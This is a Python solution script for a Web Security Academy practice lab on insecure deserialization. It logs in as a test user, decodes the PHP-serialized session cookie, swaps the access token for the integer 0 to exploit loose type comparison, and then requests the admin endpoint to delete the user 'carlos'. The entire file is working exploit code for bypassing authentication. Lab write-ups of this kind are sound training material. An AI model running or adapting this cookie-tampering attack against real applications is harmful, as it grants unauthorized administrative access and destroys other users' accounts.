# Lab: Modifying serialized data types
# difficulty: practitioner

import requests
import base64
import re

sub = '0a0e0065034ee23780550d4a00370002'
url = f'https://{sub}.web-security-academy.net'

def login():
    global session
    session = requests.Session()
    body = {
        'username': 'wiener',
        'password': 'peter'
    }
    session.post(url + '/login', data=body)

def exploit():
    cookie = session.cookies['session'].replace('%3d', '=')
    cookie = base64.b64decode(cookie)

    # replacing access_token to bypass insecure php logic 
    pattern = r'token";(.*);}'
    token = re.findall(pattern, cookie.decode())[0].encode()
    cookie = cookie.replace(token, b'i:0')
    
    # base64 session
    cookie = base64.urlsafe_b64encode(cookie).decode()

    session.cookies.clear()
    session.cookies['session'] = cookie
    r = session.get(url + '/admin/delete?username=carlos', allow_redirects=False)
    print(r.request.headers)

if __name__ == '__main__':
    login()
    exploit()